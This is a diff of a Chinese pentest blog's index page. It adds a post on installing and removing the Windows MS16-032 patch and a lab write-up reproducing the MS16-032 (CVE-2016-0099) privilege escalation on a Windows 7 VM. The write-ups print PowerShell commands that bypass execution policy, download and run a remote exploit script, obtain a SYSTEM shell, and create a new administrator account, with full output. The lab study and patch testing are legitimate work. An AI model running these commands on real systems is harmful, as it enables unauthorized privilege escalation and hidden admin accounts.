-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-Linux 提权常用命令集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1533,6 +1344,381 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/Linux 提权常用命令集/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Windows系统添加补丁" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p># </p>
+<h1 id="补丁下载"><a href="#补丁下载" class="headerlink" title="补丁下载"></a>补丁下载</h1><p>各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到<code>Microsoft</code>的官网去查看和下载：<a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></p>
+<p>点击左边栏的<code>Security Bulletins</code>可以查找想要看的漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-1.png" alt="1"></p>
+<p>这里以打<code>MS16-032（CVE-2016-0099）</code>的补丁为例：左边栏找到<code>MS16-032</code>，找到系统对应版本</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-2.png" alt="2"></p>
+<p>在跳转页面后，点击<code>Download</code>，下载</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-3.png" alt="3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-4.png" alt="4"></p>
+<h1 id="补丁安装"><a href="#补丁安装" class="headerlink" title="补丁安装"></a>补丁安装</h1><p>Windows系统自带补丁安装程序：<code>wusa</code>。命令行执行<code>wusa.exe</code>可以弹出使用帮助</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-5.png" alt="5"></p>
+<p>命令行安装补丁（要制定完整的文件地址，不能是相对地址）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;wusa E:\MS16-032\Windows6.1-KB3139914-x64.msu</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-6.png" alt="6"></p>
+<p>补丁安装完成需要<code>重启计算机才能生效</code>。重启完之后，看一下补丁的安装情况。可以看到<code>KB3139914</code>已经安装了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;systeminfo</span><br><span class="line">...</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">修补程序:         安装了 5 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB2999226</span><br><span class="line">                  [03]: KB3139914</span><br><span class="line">                  [04]: KB958488</span><br><span class="line">                  [05]: KB976902</span><br><span class="line">...</span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p>当前系统存在的用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;net user</span><br><span class="line"></span><br><span class="line">\\WIN... 的用户帐户</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<p>执行<code>MS16-032（CVE-2016-0099）</code>的脚本，可以参考之前这篇文章：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">[!] No valid thread handles were captured, exiting!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p>从结果可以看出，已经无法成功执行，说明我们打的补丁已经生效了</p>
+<h1 id="补丁卸载"><a href="#补丁卸载" class="headerlink" title="补丁卸载"></a>补丁卸载</h1><p>命令行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;wusa /uninstall /kb:3139914</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-7.png" alt="7"></p>
+<p>卸载完成之后需要重启。重启后我们再次查看补丁列表，已经没有了<code>KB3139914</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;systeminfo</span><br><span class="line">...</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">修补程序:         安装了 5 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB2999226</span><br><span class="line">                  [03]: KB958488</span><br><span class="line">                  [04]: KB976902</span><br><span class="line">...</span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p>试一下执行<code>MS16-032（CVE-2016-0099）</code>的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user</span><br><span class="line"></span><br><span class="line">\\WIN... 的用户帐户</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p>脚本又能执行成功了，说明我们成功卸载补丁</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-MS16-032（CVE-2016-0099）复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/">MS16-032（CVE-2016-0099）复现</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>漏洞类型：特权提升</p>
+<p>Microsoft 安全公告：<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032</a></p>
+<p>exploit-db的详情：<a href="https://www.exploit-db.com/exploits/39574/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/39574/</a></p>
+<p>利用时需要满足的要求</p>
+<blockquote>
+<p>①系统需要拥有至少2个的CPU核心</p>
+<p>②Power shell v2.0以及更高的版本</p>
+</blockquote>
+<p>影响的Windwos版本</p>
+<blockquote>
+<p>Windows Vista、Windows 7、Windows 2008 Server、Windows 2012 Server、Windows 8.1、Windows 10</p>
+</blockquote>
+<p>本次复现的版本为Windows 7，其他的没有再去复现</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>虚拟机平台：VMware Workstation Pro</p>
+<p>测试机：Windows 7</p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>测试一：普通用户登录下，获取管理员cmd</p>
+<p>脚本地址：<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1" target="_blank" rel="noopener">1_Invoke-MS16-032.ps1</a></p>
+<p>创建文件的方法有多种，这里演示两种：</p>
+<p>①创建文件<code>1_Invoke-MS16-032.ps1</code>并写入内容；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;type nul &gt; 1_Invoke-MS16-032.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;notepad 1_Invoke-MS16-032.ps1	#写入内容</span><br></pre></td></tr></table></figure>
+<p>②用之前提到的powershell脚本直接下载文件</p>
+<p>Ps：可以参考我之前转载的文章：<a href="https://knlvre.github.io/Knlvre.github-io/2019/10/04/%E5%8D%81%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/">十三种方式下载文件</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;type nul &gt; download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;notepad download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;type download.ps1</span><br><span class="line">$p = New-Object System.Net.WebClient</span><br><span class="line">$p.DownloadFile(&quot;https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1&quot;,&quot;E:\MS16-032\1_Invoke-MS16-032.ps1&quot;)</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;dir</span><br><span class="line">2019/10/04  03:08    &lt;DIR&gt;          .</span><br><span class="line">2019/10/04  03:08    &lt;DIR&gt;          ..</span><br><span class="line">2019/10/04  03:08               184 download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; . .\download.ps1</span><br><span class="line">PS E:\MS16-032&gt; dir</span><br><span class="line">Mode                LastWriteTime     Length Name</span><br><span class="line">----                -------------     ------ ----</span><br><span class="line">-a---         2019/10/4      3:08      11460 1_Invoke-MS16-032.ps1</span><br><span class="line">-a---         2019/10/4      3:08        184 download.ps1</span><br></pre></td></tr></table></figure>
+<p>文件下载好之后，先展示一下当前用户，以及属组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;whoami</span><br><span class="line">win...\test</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user  test</span><br><span class="line">用户名                 test</span><br><span class="line">...</span><br><span class="line">可允许的登录小时数     All</span><br><span class="line"></span><br><span class="line">本地组成员             *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<p>无权的一个用户，现在开始执行脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; . .\1_Invoke-MS16-032.ps1</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; Invoke-MS16-032</span><br><span class="line">         __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">        |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">        |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">        |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                       [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handle</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p>执行完之后，直接拿到管理员的cmd</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/ms16_032-1.png" alt="1-1"></p>
+<p>前面的步骤时进入powershell在执行命令，但其实可以加一个<code>-c</code>参数，后面可以直接接命令，分号分隔开，然后就会自动执行，不用进入powershell。当然，这是根据个人喜好，进入powershell之后还有tab自动补全等功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -exec bypass -c &quot;. .\1_Invoke-MS16-032.ps1;Invoke-MS16-032&quot;</span><br><span class="line">         __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">        |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">        |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">        |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                       [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handle</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>测试二：普通用户登录下，创建其他用户，并加入<code>administrators</code>组</p>
+<p>脚本地址：<a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1" target="_blank" rel="noopener">2_Invoke-MS16-032.ps1</a></p>
+<p>Ps：相对于测试一的脚本，该脚本进行了简单改变，可以执行任意程序，并可以添加参数执行（全程无弹框）。<code>-Application</code>参数可以执行任意程序</p>
+<p>先看一下权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;whoami</span><br><span class="line">win...\test</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test /add</span><br><span class="line">发生系统错误 5。</span><br><span class="line"></span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
+<p>在这里又学了一招，不用下载文件，直接远程利用脚本，不用下载到本地（当然也可以像之前那样）。现在开始执行脚本，直接试一下添加用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">test                     test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test</span><br><span class="line">用户名                 test_test</span><br><span class="line">...</span><br><span class="line">本地组成员             *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>test_test</code>用户添加完成，但是只属于<code>Users组</code>，现在将其加入<code>Administrators组</code>，先查看一下组和权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;net localgroup Administrators</span><br><span class="line">别名     Administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">----------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net localgroup Administrators test_test /add</span><br><span class="line">发生系统错误 5。</span><br><span class="line"></span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
+<p>然后执行脚本并验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net localgroup Administrators test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net localgroup Administrators</span><br><span class="line">别名     Administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">---------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test</span><br><span class="line">用户名                 test_test</span><br><span class="line">...</span><br><span class="line">本地组成员             *Administrators       *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<hr>
+<p>参考文章</p>
+<p><a href="https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html" target="_blank" rel="noopener">https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-十三种方式下载文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
